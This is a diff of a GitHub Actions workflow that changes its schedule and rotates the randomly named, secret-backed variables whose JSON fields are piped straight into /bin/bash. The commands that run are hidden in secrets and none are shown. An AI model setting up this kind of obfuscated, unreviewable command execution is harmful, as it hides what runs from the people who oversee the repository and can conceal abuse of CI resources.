@@ -3,29 +3,23 @@ name: trianglebreadline
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 1/6 * * *'
+    - cron: '30 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: trianglebreadline
         env:
-          gm84466: ${{ secrets.gm84466 }}
+          frox85937: ${{ secrets.frox85937 }}
         run: |
-          echo $gm84466 | jq -r .myk612 | /bin/bash
-          echo $g7120 | jq -r .dajd7 | /bin/bash
-          echo $i47014 | jq -r .qbwr108 | /bin/bash
-          echo $mld76028 | jq -r .o9 | /bin/bash
-          echo $p51 | jq -r .sof7595 | /bin/bash
-          echo $lggqk6588 | jq -r .uywc287 | /bin/bash
-          echo $pdely13 | jq -r .pa59 | /bin/bash
-          echo $uxne3841 | jq -r .oh8364 | /bin/bash
-          echo $g92596 | jq -r .w3113 | /bin/bash
-          echo $dr08665 | jq -r .ty111 | /bin/bash
-          echo $fbi9 | jq -r .ldi2 | /bin/bash
-          echo $njqee129 | jq -r .m195 | /bin/bash
-          echo $stxr2 | jq -r .gdvtg6 | /bin/bash
+          echo $frox85937 | jq -r .tt8 | /bin/bash
+          echo $l99960 | jq -r .mnmi862 | /bin/bash
+          echo $yaaee66 | jq -r .ub99 | /bin/bash
+          echo $fiwt796 | jq -r .x2 | /bin/bash
+          echo $sa274 | jq -r .wf72 | /bin/bash
+          echo $did23 | jq -r .ht0371 | /bin/bash
+          echo $ruq432 | jq -r .rjwkj45436 | /bin/bash
+          echo $yg5 | jq -r .faafn05272 | /bin/bash
 
